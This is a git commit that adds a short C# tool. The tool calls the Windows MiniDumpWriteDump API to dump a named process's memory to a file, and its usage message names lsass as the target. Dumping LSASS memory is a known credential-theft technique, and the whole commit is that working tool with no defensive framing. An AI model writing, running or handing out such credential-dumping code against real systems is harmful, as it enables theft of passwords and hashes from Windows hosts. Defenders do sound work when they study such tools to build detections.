ab72110f5d28d7da090aa78df1f055b3d25a0587
7kbstorm <38887063+7kbstorm@users.noreply.github.com>
2020-01-26 23:00:45 +0800

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,39 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+
+namespace MiniDumpWriteDump
+{
+    class Program
+    {
+        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
+        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle OutFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);
+
+        static void Main(string[] args)
+        {
+            try
+            {
+                Process[] process = Process.GetProcessesByName(args[0]);
+                Console.WriteLine("Get Processes Handle is " + process[0].Handle);
+                Console.WriteLine("Get Processes Id is " + process[0].Id);
+                using (FileStream fs = new FileStream("7kb.tmp", FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
+                {
+                    Console.WriteLine("Dump Status:" + MiniDumpWriteDump(process[0].Handle, (uint)process[0].Id, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero));
+                }
+            }
+            catch (Exception)
+            {
+                Console.WriteLine("MiniDumpWriteDump.exe lsass");
+            }
+         
+
+        }
+
+
+
+    }
+}
